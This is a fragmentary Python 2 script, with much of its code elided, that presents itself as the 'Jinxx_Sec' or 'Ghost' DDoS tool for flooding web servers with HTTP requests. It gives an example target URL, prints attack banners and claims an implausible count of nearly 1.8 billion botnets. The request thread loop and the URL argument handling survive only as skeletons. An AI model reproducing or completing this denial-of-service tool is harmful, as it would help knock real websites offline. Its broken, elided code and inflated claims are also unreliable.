...
def usage():
	print 'host Priv8 Jinxx_Sec DDoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: Ghost (url)'
	print 'Example: Ghost.py http://luthi.co.il/'
	print "\a"
print \
"""
       .-.
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> ghosts attack started Sended <<<-----"
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amount of packets generated by Proxy IP'S  --"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the ghost Attacking in webserver In Massive Revolt DDoS Tool"
		print "Created By Christian Bier akak Jinxx_Sec"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
